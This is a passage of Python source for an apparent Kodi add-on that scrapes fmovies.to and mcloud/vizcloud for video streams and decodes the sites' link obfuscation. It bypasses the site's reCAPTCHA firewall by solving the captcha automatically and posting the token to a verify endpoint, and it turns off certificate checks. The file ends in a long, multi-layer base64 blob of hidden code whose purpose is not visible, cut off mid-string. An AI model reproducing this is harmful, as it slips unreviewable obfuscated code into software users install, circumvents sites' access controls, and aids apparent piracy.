        response = sess.get(subtx, headers=headers, verify=False).json()

        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)    
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'mcloud' in link2 or 'vizcloud' in link2:

        pattern = r'(?://|\.)((?:my?|viz)cloud\.(?:to|digital|cloud))/(?:embed|e)/([0-9a-zA-Z]+)'
        hostm_id = re.findall(pattern,link,re.DOTALL)
        #

        if hostm_id:
            media_id = hostm_id[0][1]
            host = hostm_id[0][0]
            med_id = vidcloud_deco(media_id)

            link = re.sub('/(?:embed|e)/','/info/',link2).replace(media_id,med_id.replace('=','').replace('/','_'))
        stream_url = ''
        try:
            response = sess.get(link, headers=headers, verify=False).json()
            outz=[]
    
            if 'success' in response:
                if response.get('success',None):
                    srcs = response.get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
            elif 'status' in response:
                if response.get('status',None) == 200:
                    srcs = response.get('data',None).get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
        except:
            pass
    
    
    

    else:
        
        stream_url = resolveurl.resolve(link)
    if stream_url:
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

def DecodeLink(mainurl):

    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]    #23.09.21

    ac= decode2(ac2)
    
    link = dekodujNowe(ab,ac)
    link = unquote(link)
    return link

#def getFileJson():
#    with xbmcvfs.File(jfilename) as f:
#        jsondata = json.loads(f.read())
#    html =     jsondata.get('html',None)
#    return html


    
    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =     jsondata.get('html',None)
    return html


def getLinksSerial(hrefx):
    try:
        sez,ep = hrefx.split('-')
    except:
        sez,ep,sh = hrefx.split('-')
    a=''
    
    htmlx =     getFileJson()
    href = re.findall('href="([^"]+)',htmlx)[0]
    href = 'https://fmovies.to'+href if href.startswith('/') else href
    
    
    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"title"}) # = <h1 itemprop="name" class="title">
    mname = mname[0] if mname else ''
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    
    
    
    
    
       
#    for serv,linkid,href in servid :
#    
#        href = 'https://fmovies.to'+href if href.startswith('/') else href
#    
#        nazwax = '- '+nazwa if mname else nazwa
#        host = re.findall('data-id="%s".*?>(.+?)<'%str(serv),servers,re.DOTALL)[0]
#        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
#        add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    #if len(servid)>0:
    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle)    
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinksSerial', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle)    
    
def getEpisodes(href):
    seas,serv = href.split('|')

    html =     getFileJson() 

   # episodes = re.findall('data-season="%s"(.*?)<\/ul>'%str(seas),html,re.DOTALL)[0]

    
    episodes = parseDOM(html,'div', attrs={'class': "episodes",'data\-season': str(seas)})[0] 
    
    
    
    out=[]

    #<div class="episode">
    epizody = parseDOM(episodes, 'div', attrs={'class': "episode"})#[0] 
    for epi in epizody:
    
   # for kname,title in re.findall('data-kname="([^"]+).*?>(.+?)<\/',episodes,re.DOTALL):
        kname = re.findall('data\-kname="([^"]+)',epi,re.DOTALL)[0]

        try:
            sez,epis = kname.split('-')
        except:
            sez,epis,sh = kname.split('-')
        seas = 'S%02d'%int(sez)
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)
        title = re.findall('class="name">([^<]+)',epi,re.DOTALL)#[0]
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        out.append({'title':PLchar(title) ,'href':kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle)    
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})

    recap =         addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"
 
    verid = getVerid(id)    
    params = (
        ('id', id),
        ('vrf', verid),

    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html = (response.content)

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')
 
    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#
    
        
    jsondata = response.json()

    with io.open(jfilename, 'w', encoding='utf8') as f:
        str_ = json.dumps(jsondata,
            indent=4, sort_keys=True,
            separators=(',', ': '), ensure_ascii=False)
        f.write(to_unicode(str_))

    html = jsondata.get('html',None)
    

  #  sezony = parseDOM(html, 'ul', attrs={'class': "seasons"})[0]
  #  sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)
    sezony = parseDOM(html, 'div', attrs={'id': "seasons"})[0]
    
    

    sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)

    for sez in sezonyx:

       # sesid,servers,title = re.findall('data-id="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
     #   sesid,servers,title = re.findall('data-number="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
        

        sesid = re.findall('value="([^"]+)',sez,re.DOTALL)[0]
        title= re.findall('>([^<]+)<span',sez,re.DOTALL)[0]
        servers = ''
        out.append({'title':title.strip()+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
    seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
    
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
    #e+=1
        o = (o + e) % c
        u = (u + i[o]) % c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x


def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")    
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">")    
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")    
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')    
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")    
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")    
    return char    

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NGU3NTRmMzQzODY5NTM0YTY2NzA2NTUxNTAzMzQ0NDI3NTYxNjg3NTZhNDc0ZTQxMzEzNjZiNmU0MTdhNjczOTQxNDI1NTZiNjk0YjY0NmY2Yjc2NDI2ZDc5MzU0NTc2Nzk2OTU5NDM3MTU2NDU1NTUzNGIzMTUxNzk0NzUzNTg3YTM5NzI0NzYxNGY3MTY1MmY2NjMwNDg0YTc5NDg1MTUzNDc2NzZjNDU2NzM2N2E2NTMyNzk3YTRlNzg3NDY1NjYzMjMzNzY3ODMyNzUzNTY1MzM2ZTM0NjU2NjY2MzM3NjcyNjY2NjJmNzQ3NjY2MzU3NDZlMmY3NTJiMmYyZjY2Mzc2MjcxNTczNTc1MzkzNDJiMmY3NjY1MzMyZjY2NzY2NzMyMmI1YTY1MmYzODU5Mzc3OTM3MzcyZjJmNTY3NDJmNzU3YTYxMmY0NDM0MmIzOTJmMmIzOTY1MmYyZjYxNDgzNjMyNjU1Nzc0NTg2ZTM0NTcyZjcyNzA1MzY2NmE2ODMxMzQzOTc0NWE2NTU1NTc2NTUwNDkzMjQ2NDc3YTY2NGUzMjMzNjIzMjU3NTYzNzZhMzQzNjM2NjU0NDMwNTczMjRkMzY0OTY2NzMzMjM5NzYyZjc1NTc0NTdhMmY0ZjYyNmM1Njc4MzI3NDc2MzQzNzZlNmQ3NjY1NjM0ODMxNmU1ODUyNmYzODM4MmY0NjZkNjgzODJiMzk3NjdhNjI0YzMzNmU2YzUyNTAzMDcwNzI2ZDUzNTcyZjZjNmI0ZTZjNGMzOTMyNjQ3MTUxNjY1MDRiNzQ3YTM4NzU1Mjc5Mzg1MTU3NjUzNzcxNTIzNTMyNzc3YTRjNGM0YTM4NzM2ODRlNmU1YTVhNjU0NjcwNmQ2MTZjNjg2YzJiNjI0MTYzNjM2ZDczMzUzNjRmNmM3OTM0Mzk2ZTYxMzU2MjM5NmE1NzMyNjQ0YTc0NTQ3YTQ4MzE3MzZmNzQ0YTM4NzM3MzQ4NzI1MzM3NmQyYjQzMzc3MzUyNzQ3OTU3NzcyYjRmNzQ1NDdhNmE3NTZjNzY2MTRmMzkzNDMzNzg0NjYyNDIzNzM0NGU2YTcyNGU3YTZiNzQ0ODU0NTY3MzQ0N2E3YTU4NTU2MzQ0Mzc3ODMyNTc0YzcxMzYzNzUzNTkzMTUwNDcyYjJmNzE0OTU5NGU1MjZlNGY0ZTRmNDQzMjU2NjY2ZTQzNDg0ODZmNDc3ODM5N2E3NTMyNmMzNzMxNmQzNzM4MzgzOTY2NTM3YTc5NDQzOTc4NmU0YzRkMmI1NDQyNTQ0ODU3NzQ3MjQ2NTU1NzU0MzU2MTMxNzc2ZTY5MzQzMzJmNDk2NzU2MzE0NjcwNzY0ODY0MzUzMTY4MzM2YjM1Njk2NjZkNjY0ZDUxMzQ1OTYzMzMzNTQ2NDMzNTMxMzQ1NTQzMmI2NjRiNzI3MjQ4NjQzNTU0MmY0YjQ5MmI2ZjQyNjQ3MjU3NjU0ZDM5MzA0ZDQ4MzQ2NTdhNmU0MjRmN2E2OTUwNzMzMTc3MmYzNDM3NmIzNjRlMzU1OTc1NzYyYjc0NjgzNTU3NmY0NDc2Mzk3NjRjNTQ0MTJmNGM1Nzc2NjMzNzU4NzA2NjMzNjE0ZDcxNDY0ZjVhNjI2YTRhMzg2NTQ2NDg0MTU4NzU3NzM3Njc1OTY2N2E2NDY0NDQ2YTc2NmY0NzY2NjM1MDM4NzAzNzcwMzg2ZTc5MzA2YzJiNjY2OTU0NTA2ZTc4NTA0ZjU4NDM0NzMwNzI0ZDQ1MzgzODUwNTk1NDMyNGY3ODMzNmU3NjRmNDIzOTdhMzY2NTUwNjQ2ZDU0NjI3NzUwNGY3OTMwMzYzNjZkNmU1ODYxNTk2ZTMwNDI0ZTc0Mzk2ZjUxMmI0YzRhNDc2ZTZhNjk0NTc2MzU3NzczMzk3NTc1NzQ2Njc1NDEzNTM1NjkzNTRmNGQ2NzU2NmI3MzczNzc3MDc5NzczNjM2Nzc3MjY1NjI1OTM5NDk0ZTdhNjk1NDQ4MzQ2MjMzN2E1NzRkNjEzNTQ0MzM2Zjc4MmI2Nzc2NDY2ODM0MzU1NTRjNzYzMzQzNTA1Mjc1NDY0MzYyN2E1ODZkNGQ1NzY4NTQzOTRhMzM2ODc2NjI0MjcyNjM2MzM1MzcyZjRkMzczNzU5NDY0ZjQ2MzUzOTYyNTEzNzc4NDg3OTMwNTMzNzM0NGMzMDczNzU2ZDQxMmI3NTZjMzc0NDMzNDU2NjRmNTAzODU0N2EzOTU1NmI1MDY2NGQ1NDJiNmUzMDRjNGYzOTc5NzY2NzY0NjM2ZDRlNzM1ODQ5NjU3MzUwN2E0NzRmNmY2ZTM1NGQzNjRhN2EyYjY3MmI2MzY3NGYyYjU4NGYzODRlNzQ1MTY0NzY2NzMzNzg2NzMxNTA0ODQ1MmIzNzMwNDc3Njc0MzQ1YTM3NmI3NjUwNTQ3MDc5MmY0MzU0NzI0ZDU0MzQ2NTRiMzk1MDY2MzQzMTM3N2E2NzY0NzkzMTUyNzg2YTRlMzA0MTJmNmQ1NzRlNzE1NjMzNjU1MTQ0MzUyYjQ5NDYzOTY4NmY1MjdhMzg2MjYzNjg1MDJiNjUzNDQ3MzgzNDdhNzY0NjQ4NmU2YjZlMzg3YTc1NTg0YTc2MzE1NDM3NGY3ODUzNjQzNTZhNDQ3NTU5NTQ2NTQzNmE3OTc2MzQ1YTM5MzQ0NDZlNGE0MTQ4MzU0NDM3NjE0ZDQ4NzUzMDQ4MzE2YzY5NzgzNjQ3Njk3MzJmNDIzMzM2NmM2Njc5NDg0ZDJiNzc2ZTM5N2E3YTc0NzQ0NTJmNGY0ODJiNDg1YTM2NDQzMzUwNDEzMTJiNGQ2ZDU0Mzg2MTczNWE0MjJiMzQ1MjM4NzkzMzRmMzQ2OTRmNWE3ODZlNGY2NTc3NjI2ODQ3NzI0NzRjMmI2OTQ0NjQ0YzJmNDI1NjJiNjc0ODQ1NDgzNjY3NmMyYjRmNTU2NzYzNjM0MjdhNTkzMDU3NDU2MzM0NzQ0ZjQ0NDg2Mzc1NmUyYjQyNjY3NTZiMzM2OTU3MzYzNTcwNzg3OTU0NmE0ODJiMzY2YjY2NDQ3YTRhNmEzMzZkNGE2NjM2NDE2NDMyNGI0YjY5NjY0ZDJiNGY3MzUxNDg3YTU0MzkyZjQ2MzM3Mjc1NDM1MDMxNDg0NTM4MzY3MTU3NmQzNzc1NDEzMzRjNzU1OTZhMzg3NDQ2MmY0NTRmMmYyYjdhNjc0MzRmNmQ1OTc3NmUzNjUwMmY0MzJiNTMzODZjNzY2ZDUwNDc0MzY1NWE0NDQ4NGU2ODMxNzM0Mjc1NzU3ODJmNTI3MDdhNDE0ODc5Nzc3MDM5MzM2YTQ5MmI0MjM4NmY3MTJiMzQ0NDJmMzU2YjJmNGU2MjY5NzAzOTU3NzA3NTQyNTU0NjcwNzU1MTc3NTM0MTJiNDU0NjUwNzc0ODZjNTA3MzUwNmE2OTYzNmYzODUxNDQzNTRhNzc0OTJmNmQ1NDQxNmU1NjcwNTQ1MDMxMzg3ODQyNjg3OTcwNjk1NDc2Nzc2ZTMwN2E0NDUwMmY0MzYzNTMzMTdhNDI1MDUwNDI2NDM4NDkzMDJiNmQ2MzQ3MmI0MTMyNGM3NzQ0NGUzODM2NTEzMzM2NTg1MDczNjkzNDZmNjQyYjU3NzM0ODc0NGE2NTM5NGQ3NjJiNTUzNzU5NzMzMjQxNjM3NzJmMzUzNDdhNzA1NjM0NDg1MzUzNzU1OTQ2NzY2OTQ0NzY1MTc4NTI1Mjc4NDMyZjc1NDk2OTYzNTQ3MjY5MzI0ZDQ0NmU2OTRhNzQ2MTY0NGE0NDU0NzI3OTZiNzYzOTQ1NTAyZjUwNDEzNzMwNGQ2MzdhNjQ0NzRjNDczNjZmNzUzOTUyNTQ3ODY3MmY2ZTY5MzUzOTc3NTg0NzYyNzQ3MDU4MzQ0ODMwNzI2ZjQ4MzM2ZjQ2NzI2ZDZlNjc0YzRmNGE2NzM5NDY1MDRjNGQzMTVhNjk2ODc4NDkzNDU0NjQ3YTY5MmY2NjUxMzM3ODQxNTgzOTMzNTA0YjQxNjQyZjUyNmUzODU3MzM3MTZkNTg0NTQ1NGYzMzY5NDczNDQzNTg2YTQ1NmQ0ZDc1NGI2MTJmNDk2YTdhNmM2Yzc0NDE3NjZkNGI0ODM3NmIzODU0NzIzMDYzNzM1MTc2Nzc0MzU0MzYzMzMwNDE3MzdhNTM1ODY1NzgyZjY5NDMzMzU0NjU2NTc3NTg2YTQ2NjQzMDRmNjY0ZDYzMzczNTUzNDg3NjU1NmY2YjUwNGQ0ODY2NDY2ZjM2Njk3NzU4NmU0OTQ0MmI0OTRjMmY0NTUwNzYzMDRlMmI2OTQ0NGYzNTRjNTE2MjM3NTU3OTZiNTk1Nzc3NTkzMTRmNGY1MzRmNDQ1ODM2NGYyZjRhNTI0MTU4Nzc2ZjUyNTY2MjY5NDg2NjUxNzYyYjQ5NjMyZjM0NGM0YTZhNTMzNzdhNTM1MjM2Njc2ZTM0NDQ2YzJiNDIzNjM3NjczMzZiN2E2ZDYxNjQ0MzMyNTkyZjc3Nzk1YTJiMzE2ZjRlMzU3NjM2NDU2ZTMyNGM1ODc4NDk2ZTY5NTI1MDQ1NjQ2NTcxMzc3MDRkMzQ1OTZkMzg0MTRhMzQ2OTc2Mzk1NTM5NTA3NjRkNDIyZjU5NmQ2NjZhNGY3NTQ3NDE2NTQ1Nzg3Mzc5NDgyYjU3Nzc2NzMyNjE2NTY3NmMzMDUxNTMzODc4NzY3ODQ0NDg3ODRlMzg1MjRhN2E1NTJmNmYzMTY5NjQ0Nzc3NDUzNzMwMzk3YTUwMzk2ZDRlNmE0ZDY1NTQ3MTQzMzAzODZhNDg3NzQ1NmU1OTZiMzM2MTQ2NzY0OTRiNmE1ODM3Njc0ZTJmMzA0NTJiNDY3NjdhNzYzODQyMzc0ZDY5NjY0YzQxNmE2OTRhNDg0MjU0MzA1MjU3MzQ2YTQ4Mzg0MjUwNjk1MzQxNWE3MzZiMzk2OTQzNTg2NDc5NzY2NjRkNGUzNTZlNmU1MDQyNjk3ODU4Nzg0NDJmMzc0MTJiNjM0MzZkNTgzOTM4NzIzMTY3NTY1MDdhNDI3NjJiNDgzMTczNmEzNzczNGU3NTY3MmI1MjM1NmQzNzcwNTk2OTY0MzU1OTRhN2E0MjJiNDg0ZjRhNTk3YTMzNjc1MTc2NGM1OTZiMzc3NzQxNmU3MTQ4MmY2YjY4NTU3NzY4NmE3NTZlMzM0ZjY2NDU0NjM3N2E2ZjRmNTk2NzY2NTgzNjc3NzY1MjY4MzI0YzM4NTU1NTM2NDQ0ZjQxNzEzOTQ3MzQ0OTMzNmI3MDczNzg2YTczNTUzNDY3N2EzMTQ3NTQ0NzQ1MmI1YTUyMzc3MDM2NGEyZjc3NjM3Nzc2NTg2OTUyNzMzOTc4Nzg1NzM5MzE2ODRjNTgzNDY4Mzg0NjZlMzU0ODUwNTI0ODQxNTgyYjQ3NTM1MDYzNTE2YjM3NDUzNDM5NWE2YzJmNjc2NTM5NjM2ZDU5MmYzODQ5NTIzNDRlMzk1OTU0MzI0NzRkNDU1YTRlNjczMzMxNzA0YzdhNDc0MTJiNzg0MTZiMmI2ODM3Nzk0MjY1NGI1NDUwNDk3NDM4Nzc0NDY4MzMzNjZjMzg0NzM2NDQ0ZTY1NmUyZjQ2MzE2OTY0NzE0MzY0Njk1NTQ2NTM2ODM5NDY1MDYxNDM2NjZkNjYzMDUwNDc2ZjU2MmIzNjcyNDIzMTMyNzM0NDY2NmEzNjcxNzM0ZjU5NmE3YTUxNzI2YzZjNmM0MzQ1NTk0MjQ1N2E1NjZhNDM1ODY3MzAzMTZhNmI2